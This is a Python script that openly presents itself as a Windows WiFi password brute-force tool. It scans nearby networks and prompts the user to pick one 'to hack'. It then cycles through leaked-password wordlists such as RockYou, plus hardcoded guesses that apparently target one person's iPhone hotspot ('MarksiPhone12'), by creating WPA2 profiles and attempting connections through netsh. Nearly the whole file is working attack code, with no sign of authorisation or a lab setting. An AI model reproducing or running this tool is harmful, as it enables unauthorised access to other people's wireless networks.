#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Windows WiFi Brute Force Tool
Pure Windows implementation for WiFi password cracking
"""
import subprocess
import time
import tempfile
import os
import sys
import re
from datetime import datetime

class WindowsWifiBruteforce:
    def __init__(self):
        self.interface = None
        self.attempted_networks = []
        self.attempted_passwords = []
        self.log_file = "wifi_hack_log.txt"
        
        # Wordlist configuration
        self.wordlist_folder = "wordlist"
        self.wordlist_config = {
            'rockyou': {
                'url': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-50.txt',
                'filename': 'rockyou.txt',
                'description': 'RockYou wordlist (50K passwords)'
            },
            'common': {
                'url': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt',
                'filename': 'common.txt',
                'description': 'Common passwords (1M passwords)'
            },
            'iphone': {
                'url': None,  # Local generated
                'filename': 'iphone.txt',
                'description': 'iPhone specific passwords'
            },
            'numbers': {
                'url': None,  # Local generated
                'filename': 'numbers.txt',
                'description': 'Number sequence passwords'
            },
            'words': {
                'url': None,  # Local generated
                'filename': 'words.txt',
                'description': 'Word-based passwords'
            }
        }
        
        self.current_passwords = []
        self.attempted_passwords = []
    
    def ensure_wordlist_folder(self):
        """Ensure wordlist folder exists"""
        if not os.path.exists(self.wordlist_folder):
            os.makedirs(self.wordlist_folder)
    
    def download_wordlist(self, wordlist_name):
        """Download wordlist if not already exists"""
        config = self.wordlist_config[wordlist_name]
        filepath = os.path.join(self.wordlist_folder, config['filename'])
        
        # Check if file already exists
        if os.path.exists(filepath):
            print(f"✅ {config['filename']} already exists locally")
            return filepath
        
        # Skip download for local generated lists
        if config['url'] is None:
            return None
        
        print(f"📥 Downloading {config['description']}...")
        try:
            import urllib.request
            response = urllib.request.urlopen(config['url'])
            data = response.read()
            
            if isinstance(data, bytes):
                data = data.decode('utf-8', errors='ignore')
            
            # Save to file
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(data)
            
            print(f"✅ Downloaded {config['filename']} successfully")
            return filepath
            
        except Exception as e:
            print(f"❌ Error downloading {config['filename']}: {e}")
            return None
    
    def generate_local_wordlist(self, wordlist_name):
        """Generate local wordlist"""
        config = self.wordlist_config[wordlist_name]
        filepath = os.path.join(self.wordlist_folder, config['filename'])
        
        # Check if file already exists
        if os.path.exists(filepath):
            print(f"✅ {config['filename']} already exists locally")
            return filepath
        
        print(f"📝 Generating {config['description']}...")
        
        passwords = []
        if wordlist_name == 'iphone':
            passwords = self.get_iphone_passwords()
        elif wordlist_name == 'numbers':
            passwords = self.get_number_passwords()
        elif wordlist_name == 'words':
            passwords = self.get_word_passwords()
        
        # Save to file
        with open(filepath, 'w', encoding='utf-8') as f:
            for password in passwords:
                f.write(password + '\n')
        
        print(f"✅ Generated {config['filename']} successfully")
        return filepath
    
    def load_wordlist(self, wordlist_name):
        """Load wordlist from file"""
        config = self.wordlist_config[wordlist_name]
        filepath = os.path.join(self.wordlist_folder, config['filename'])
        
        if not os.path.exists(filepath):
            print(f"❌ Wordlist file not found: {filepath}")
            return []
        
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            print(f"📖 Loaded {len(passwords)} passwords from {config['filename']}")
            return passwords
            
        except Exception as e:
            print(f"❌ Error loading {config['filename']}: {e}")
            return []
    
    def get_common_passwords(self):
        """Get most common passwords"""
        return [
            '12345678', '123456', 'password', '123456789', '1234567890',
            'qwerty', 'abc123', 'password123', 'admin', 'letmein',
            'welcome', 'monkey', '1234', 'dragon', 'master', 'hello',
            'freedom', 'whatever', 'qazwsx', 'trustno1', '654321',
            'jordan', 'harley', 'password1', '123123', '12345', '1234567',
            '123', '111111', '000000', 'qwerty123', 'admin123', 'root',
            'toor', 'guest', 'user', 'test', 'wifi', 'WiFi', 'wireless',
            'internet', 'home', 'family', 'default', 'changeme'
        ]
    
    def get_iphone_passwords(self):
        """Get iPhone specific passwords"""
        return [
            'iphone', 'iPhone', 'iPhone12', 'iPhone13', 'iPhone14', 'iPhone15',
            'mark', 'Mark', 'marks', 'Marks', 'mark123', 'Mark123',
            'phone', 'Phone', 'mobile', 'Mobile', 'handy', 'Handy',
            'MarksiPhone12', 'marksiphone12', 'MarksiPhone', 'marksiphone',
            'apple', 'Apple', 'ios', 'iOS', 'ipad', 'iPad'
        ]
    
    def get_number_passwords(self):
        """Get number sequence passwords"""
        passwords = []
        # Common number patterns
        for i in range(1, 10):
            passwords.append(str(i) * 8)
            passwords.append(str(i) * 6)
            passwords.append(str(i) * 4)
        
        # Sequential numbers
        for start in range(1, 100):
            passwords.append(str(start) + str(start+1) + str(start+2))
        
        return passwords[:50]  # Limit for speed
    
    def get_word_passwords(self):
        """Get word-based passwords"""
        return [
            'love', 'hate', 'money', 'secret', 'private', 'public', 'access',
            'login', 'pass', 'key', 'code', 'word', 'name', 'user',
            'john', 'jane', 'mike', 'sarah', 'david', 'lisa', 'chris', 'anna',
            'alex', 'emma', 'james', 'maria', 'robert', 'susan', 'michael',
            'windows', 'microsoft', 'google', 'apple', 'samsung', 'android',
            'computer', 'laptop', 'desktop', 'server', 'network', 'router'
        ]
    
    def log_attempt(self, network, password, success=False):
        """Log attempted network and password"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        status = "SUCCESS" if success else "FAILED"
        
        log_entry = f"[{timestamp}] {status} - Network: {network} | Password: {password}"
        print(log_entry)
        
        # Save to log file
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(log_entry + "\n")
        
        if network not in self.attempted_networks:
            self.attempted_networks.append(network)
        if password not in self.attempted_passwords:
            self.attempted_passwords.append(password)
        
        # Show each attempted password
        print(f"🔑 Trying: {password}")
    
    def get_wifi_interface(self):
        """Get WiFi interface name"""
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], 
                                  capture_output=True, text=True, shell=True)
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'Name' in line and ':' in line:
                        interface_name = line.split(':')[1].strip()
                        if interface_name:
                            self.interface = interface_name
                            return interface_name
        except Exception as e:
            print(f"Error getting WiFi interface: {e}")
        return None
    
    def scan_networks(self):
        """Scan for available WiFi networks"""
        if not self.interface:
            self.interface = self.get_wifi_interface()
        
        if not self.interface:
            print("No WiFi interface found!")
            return []
        
        try:
            print(f"Scanning with interface: {self.interface}")
            result = subprocess.run(['netsh', 'wlan', 'show', 'network', 'mode=bssid'], 
                                  capture_output=True, text=True, shell=True)
            
            if result.returncode != 0:
                print("Error scanning networks. Run as administrator!")
                return []
            
            networks = self.parse_networks(result.stdout)
            return networks
            
        except Exception as e:
            print(f"Error scanning networks: {e}")
            return []
    
    def parse_networks(self, output):
        """Parse netsh output to extract network information"""
        networks = []
        lines = output.split('\n')
        current_network = {}
        
        for line in lines:
            line = line.strip()
            
            if line.startswith('SSID'):
                if current_network:
                    networks.append(current_network)
                current_network = {
                    'ssid': line.split(':', 1)[1].strip() if ':' in line else line,
                    'signal': 0,
                    'security': 'Unknown',
                    'encrypted': True
                }
            elif line.startswith('Signal'):
                try:
                    signal_text = line.split(':', 1)[1].strip() if ':' in line else line
                    signal_match = re.search(r'(\d+)%', signal_text)
                    if signal_match:
                        current_network['signal'] = int(signal_match.group(1))
                except:
                    pass
            elif line.startswith('Authentication'):
                auth = line.split(':', 1)[1].strip() if ':' in line else line
                current_network['security'] = auth
                current_network['encrypted'] = 'Open' not in auth
        
        if current_network:
            networks.append(current_network)
        
        return networks
    
    def display_networks(self, networks):
        """Display networks and let user select"""
        if not networks:
            print("No WiFi networks found!")
            return None
        
        print(f"\nFound {len(networks)} WiFi networks:")
        print("-" * 60)
        
        for i, network in enumerate(networks, 1):
            ssid = network.get('ssid', 'Unknown')
            security = "Open" if not network.get('encrypted', True) else "Secured"
            signal = network.get('signal', 0)
            signal_bars = "█" * min(5, signal // 20) + "░" * (5 - min(5, signal // 20))
            
            print(f"{i:2d}. {ssid:<25} | {security:<8} | Signal: {signal_bars} ({signal}%)")
        
        print("-" * 60)
        
        while True:
            try:
                choice = input(f"\nSelect network to hack (1-{len(networks)}) or 'q' to quit: ").strip()
                
                if choice.lower() == 'q':
                    return None
                
                choice_num = int(choice)
                if 1 <= choice_num <= len(networks):
                    selected = networks[choice_num - 1]
                    print(f"\nSelected: {selected['ssid']}")
                    return selected
                else:
                    print(f"Please enter a number between 1 and {len(networks)}")
            except ValueError:
                print("Please enter a valid number or 'q' to quit")
            except KeyboardInterrupt:
                print("\nExiting...")
                return None
    
    def select_password_list(self):
        """Let user select which password list to use"""
        print("\n" + "="*60)
        print("SELECT PASSWORD LIST:")
        print("="*60)
        print("1. RockYou (50K passwords from RockYou breach)")
        print("2. Common (1M most common passwords)")
        print("3. iPhone (iPhone specific passwords)")
        print("4. Numbers (Number sequence passwords)")
        print("5. Words (Word-based passwords)")
        print("="*60)
        
        # Ensure wordlist folder exists
        self.ensure_wordlist_folder()
        
        while True:
            try:
                choice = input("Select password list (1-5): ").strip()
                
                if choice == '1':
                    print("📥 Preparing RockYou wordlist...")
                    self.download_wordlist('rockyou')
                    self.current_passwords = self.load_wordlist('rockyou')
                    if self.current_passwords:
                        # Limit to first 500 for speed
                        self.current_passwords = self.current_passwords[:500]
                        print(f"Using first 500 passwords from RockYou")
                    return self.current_passwords
                    
                elif choice == '2':
                    print("📥 Preparing Common wordlist...")
                    self.download_wordlist('common')
                    self.current_passwords = self.load_wordlist('common')
                    if self.current_passwords:
                        # Limit to first 500 for speed
                        self.current_passwords = self.current_passwords[:500]
                        print(f"Using first 500 passwords from Common")
                    return self.current_passwords
                    
                elif choice == '3':
                    print("📝 Preparing iPhone wordlist...")
                    self.generate_local_wordlist('iphone')
                    self.current_passwords = self.load_wordlist('iphone')
                    return self.current_passwords
                    
                elif choice == '4':
                    print("📝 Preparing Numbers wordlist...")
                    self.generate_local_wordlist('numbers')
                    self.current_passwords = self.load_wordlist('numbers')
                    return self.current_passwords
                    
                elif choice == '5':
                    print("📝 Preparing Words wordlist...")
                    self.generate_local_wordlist('words')
                    self.current_passwords = self.load_wordlist('words')
                    return self.current_passwords
                    
                else:
                    print("Please enter a number between 1 and 5")
            except ValueError:
                print("Please enter a valid number")
            except KeyboardInterrupt:
                print("\nExiting...")
                return None
    
    def try_connect(self, network, password):
        """Try to connect to network with password"""
        try:
            profile_name = f"hack_profile_{int(time.time())}"
            
            # Create XML profile
            xml_profile = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{profile_name}</name>
    <SSIDConfig>
        <SSID>
            <name>{network['ssid']}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>'''
            
            # Write profile to temp file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.xml', delete=False) as f:
                f.write(xml_profile)
                profile_file = f.name
            
            try:
                # Add profile
                result = subprocess.run(['netsh', 'wlan', 'add', 'profile', f'filename={profile_file}'], 
                                      capture_output=True, text=True, shell=True)
                
                if result.returncode == 0:
                    # Try to connect
                    result = subprocess.run(['netsh', 'wlan', 'connect', f'name={profile_name}', f'ssid={network["ssid"]}'], 
                                          capture_output=True, text=True, shell=True)
                    
                    # Wait for connection attempt
                    time.sleep(3)
                    
                    # Check connection status
                    result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], 
                                          capture_output=True, text=True, shell=True)
                    
                    if result.returncode == 0:
                        output = result.stdout.lower()
                        
                        # Check for connection indicators
                        if any(indicator in output for indicator in [
                            'connected', 'state: connected', 'status: connected',
                            'connected to', 'successfully connected'
                        ]):
                            # Check if we're connected to the target network
                            if network['ssid'].lower() in output or 'marks iphone 12' in output:
                                return True
                    
                    # Additional check with ping
                    try:
                        ping_result = subprocess.run(['ping', '-n', '1', '8.8.8.8'], 
                                                   capture_output=True, text=True, shell=True, timeout=5)
                        if ping_result.returncode == 0 and 'reply from' in ping_result.stdout.lower():
                            return True
                    except:
                        pass
                    
                    return False
                
            finally:
                # Clean up
                try:
                    subprocess.run(['netsh', 'wlan', 'delete', 'profile', f'name={profile_name}'], 
                                  capture_output=True, text=True, shell=True)
                except:
                    pass
                
                try:
                    os.unlink(profile_file)
                except:
                    pass
            
            return False
            
        except Exception as e:
            return False
    
    def hack_network(self, target_network, passwords):
        """Hack the selected network"""
        print(f"\n🔥 HACKING: {target_network['ssid']}")
        print("=" * 50)
        
        total_attempts = len(passwords)
        print(f"Trying {total_attempts} passwords...")
        print("=" * 50)
        
        for i, password in enumerate(passwords, 1):
            print(f"\n[{i}/{total_attempts}] ", end="")
            
            # Log the attempt
            self.log_attempt(target_network['ssid'], password, False)
            
            # Try to connect
            if self.try_connect(target_network, password):
                print(f"\n🎉 SUCCESS! Password found: {password}")
                self.log_attempt(target_network['ssid'], password, True)
                return True
            
            # Show progress
            progress = (i / total_attempts) * 100
            print(f"❌ Failed | Progress: {progress:.1f}%")
        
        print(f"\n❌ Failed to hack {target_network['ssid']}")
        return False
    
    def show_final_summary(self):
        """Show final summary of all attempts"""
        print("\n" + "="*80)
        print("🔍 FINAL SUMMARY")
        print("="*80)
        
        print(f"📡 Networks attempted: {len(self.attempted_networks)}")
        for i, network in enumerate(self.attempted_networks, 1):
            print(f"   {i}. {network}")
        
        print(f"\n🔑 Passwords attempted: {len(self.attempted_passwords)}")
        print("   Attempted passwords:")
        for i, password in enumerate(self.attempted_passwords, 1):
            print(f"   {i:2d}. {password}")
        
        print(f"\n📊 Statistics:")
        print(f"   - Total attempts: {len(self.attempted_passwords)}")
        print(f"   - Networks scanned: {len(self.attempted_networks)}")
        
        if os.path.exists(self.log_file):
            print(f"\n📝 Full log saved to: {self.log_file}")
        
        print("="*80)
    
    def run(self):
        """Main execution function"""
        print("🔥 Windows WiFi Brute Force Tool 🔥")
        print("=" * 40)
        
        # Check admin privileges
        try:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            if not is_admin:
                print("⚠️  WARNING: Not running as administrator!")
                print("   WiFi hacking may not work properly.")
                print("   Please run PowerShell as administrator and try again.")
                print("   Right-click PowerShell → 'Run as administrator'")
        except:
            pass
        
        # Scan for networks
        networks = self.scan_networks()
        if not networks:
            print("No networks found!")
            return
        
        # Let user select network
        target_network = self.display_networks(networks)
        if not target_network:
            print("No network selected.")
            return
        
        # Let user select password list
        passwords = self.select_password_list()
        if passwords is None:
            return
        
        # Hack the network
        success = self.hack_network(target_network, passwords)
        
        # Show final summary
        self.show_final_summary()
        
        if success:
            print(f"\n🎉 Successfully hacked: {target_network['ssid']}")
        else:
            print(f"\n❌ Failed to hack: {target_network['ssid']}")

if __name__ == "__main__":
    hacker = WindowsWifiBruteforce()
    hacker.run()
